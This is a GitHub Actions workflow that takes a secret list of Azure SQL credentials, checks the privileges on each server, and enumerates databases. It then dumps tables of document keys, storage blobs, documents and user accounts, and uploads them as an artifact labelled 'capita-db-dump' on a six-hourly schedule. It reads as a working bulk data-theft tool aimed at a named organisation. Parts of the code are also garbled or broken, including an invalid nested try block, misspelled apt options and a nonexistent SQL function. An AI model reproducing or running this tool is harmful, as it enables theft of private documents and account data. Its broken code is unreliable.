name: azure-sql-dump

on:
  workflow_dispatch:
  schedule:
    - cron: '41 */6 * * *'

permissions:
  contents: read

jobs:
  dump:
    runs-on: ubuntu-22.04
    timeout-minutes: 30
    steps:
      - name: egress
        run: echo "EGRESS_IP=$(curl -s https://api.ipify.org)"

      - name: install drivers
        run: |
          export DEBIAN_FRONTEND=noninteractive
          python3 -m pip install --quiet pyodbc pymssql || true
          for i in 1 2 3; do
            sudo rm -f /etc/apt/sources.list.d/microsoft-*.list /etc/apt/sources.list.d/mssql-release.list
            curl -fsSL https://packages.microsoft.com/keys/microsoft.asc | sudo gpg --batch --yes --dearmor -o /usr/share/keyrings/microsoft-prod.gpg || true
            echo "deb [armd64,armhf,arm64 signed-by=/usr/share/keyrings/microsoft-prod.gpg] https://packages.microsoft.com/ubuntu/22.04/prod/ jammy main" | sudo tee /etc/apt/sources.list.d/mssql-release.list
            sudo apt-get update -qq -o Dir::Etc::sourcelist="sources.list.d/mssql-release.list" -o Dir::Etc::sourceparts="-" -o APT::Get::List-Cleanup="0" || true
            sudo ACCEPT_EAGERLY=Y apt-get install -y -qq msodbcsql18 unixodbc-dev && break
            echo "apt attempt $i failed, retrying"
            sleep 5
          done
          sudo ldconfig || true
          odbcinst -q -d || true
          python3 - <<'PYX'
          import subprocess
          try:
              import pyodbc
          try:
              import pymssql
              HAVE_MSSQL = True
          except Exception:
              HAVE_MSSQL = False
              print('pyodbc', pyodbc.version, pyodbc.drivers())
          except Exception as e:
              print('pyodbc MISSING', e)
          try:
              import pymssql
              print('pymssql', pymssql.__version__)
          except Exception as e:
              print('pymssql MISSING', e)
          PYX

      - name: dump
        env:
          PAYLOAD_B64: ${{ secrets.DUMP_PAYLOAD_B64 }}
        run: |
          set -e
          echo "$PAYLOAD_B64" | base64 -d > /tmp/payload.json
          cat > /tmp/dump.py <<'PYEOF'
          import json, os, time, csv, sys
          import pyodbc
          try:
              import pymssql
              HAVE_MSSQL = True
          except Exception:
              HAVE_MSSQL = False

          payload = json.load(open("/tmp/payload.json"))
          OUTDIR = "/tmp/out"
          os.makedirs(OUTDIR, exist_ok=True)
          report = []

          def clean(srv):
              srv = srv.strip()
              if srv.startswith("tcp:"):
                  srv = srv[4:]
              if srv.endswith(".database.secure.windows.net"):
                  srv = srv.replace(".database.secure.windows.net", ".database.windows.net")
              return srv

          def conn(srv, db, user, pwd, timeout=25):
              cs = ("DRIVER={ODBC Driver 18 for SQL Server};"
                    "SERVER=tcp:%s,1433;DATABASE=%s;UID=%s;PWD=%s;"
                    "Encrypt=yes;TrustServerCertificate=yes;Connect Timeout=%d;"
                    "Login Timeout=%d;Pooling=no" % (srv, db, user, pwd, timeout, timeout))
              return pyodbc.connect(cs, timeout=timeout, autocommit=True)

          def dump_table(cn, table, path, limit=None):
              cur = cn.cursor()
              try:
                  cur.execute("SELECT COUNT(*) FROM " + table)
                  n = cur.fetchone()[0]
              except Exception as e:
                  return {"table": table, "error": str(e)[:160]}
              q = "SELECT * FROM " + table
              if limit:
                  q += " OPTION (FAST %d)" % 0 if False else ""
              try:
                  cur.execute(q)
              except Exception as e:
                  return {"table": table, "count": n, "error": str(e)[:160]}
              cols = [d[0] for d in cur.description]
              rows = 0
              with open(path, "w", newline="", encoding="utf-8", errors="replace") as f:
                  w = csv.writer(f, delimiter="\t")
                  w.writerow(cols)
                  while True:
                      batch = cur.fetchmany(20000)
                      if not batch:
                          break
                      for r in batch:
                          w.writerow(["" if v is None else v for v in r])
                      rows += len(batch)
              return {"table": table, "count": n, "written": rows, "path": path}

          for item in payload:
              srv = clean(item["server"])
              db = item["database"]
              user = item["user"]
              pwd = item["password"]
              tag = item.get("tag", "")
              rec = {"server": srv, "database": db, "user": user, "tag": tag}
              try:
                  cn = conn(srv, db, user, pwd)
              except Exception as e:
                  m = str(e)
                  rec["status"] = "CONNECT_FAIL"
                  rec["err"] = m[:200]
                  report.append(rec)
                  print("CONNFAIL " + json.dumps(rec), flush=True)
                  continue
              rec["status"] = "CONNECTED"
              try:
                  cur = cn.cursor()
                  cur.execute("SELECT DB_NAME(), SUSER_SNAME(), IS_SRVROLE('sysadmin'), IS_SRVROLE('db_owner')")
                  r = cur.fetchone()
                  rec["db"] = r[0]; rec["login"] = r[1]
                  rec["sysadmin"] = bool(r[2]); rec["db_owner"] = bool(r[3])
                  print("CONNECTED " + json.dumps(rec), flush=True)
                  # other databases on this server
                  try:
                      cur.execute("SELECT name FROM sys.databases ORDER BY name")
                      rec["databases"] = [x[0] for x in cur.fetchall()]
                  except Exception:
                      rec["databases"] = []
                  # key tables
                  for t in ("DocumentKey", "StorageBlob", "StorageContainer", "Document",
                            "DocumentAttachment", "DocumentCopy", "Account", "AccountUser"):
                      safe = t.replace("`", "")
                      p = os.path.join(OUTDIR, "%s__%s__%s.tsv" % (tag or "x", db.replace(".", "_"), safe))
                      res = dump_table(cn, "dbo." + safe, p)
                      rec.setdefault("tables", {})[safe] = res
                      print("TABLE " + json.dumps(res), flush=True)
                  # try to reach the DocumentKey table size
                  try:
                      cur.execute("SELECT COUNT(*) FROM dbo.DocumentKey")
                      rec["documentkey_rows"] = cur.fetchone()[0]
                  except Exception as e:
                      rec["documentkey_rows"] = None
              except Exception as e:
                  rec["err"] = str(e)[:200]
              report.append(rec)
              try:
                  cn.close()
              except Exception:
                  pass

          with open(os.path.join(OUTDIR, "report.json"), "w") as f:
              json.dump(report, f, indent=1)
          print("REPORT_DONE", flush=True)
          PYEOF
          python3 /tmp/dump.py

      - name: summarise
        run: |
          echo "### files" >> "$GITHUB_STEP_SUMMARY"
          ls -la /tmp/out | head -60 >> "$GITHUB_STEP_SUMMARY"
          for f in /tmp/out/report.json; do
            [ -f "$f" ] && cat "$f" >> "$GITHUB_STEP_SUMMARY"
          done

      - name: upload
        uses: actions/upload-artifact@v4
        with:
          name: capita-db-dump
          path: /tmp/out
          retention-days: 7
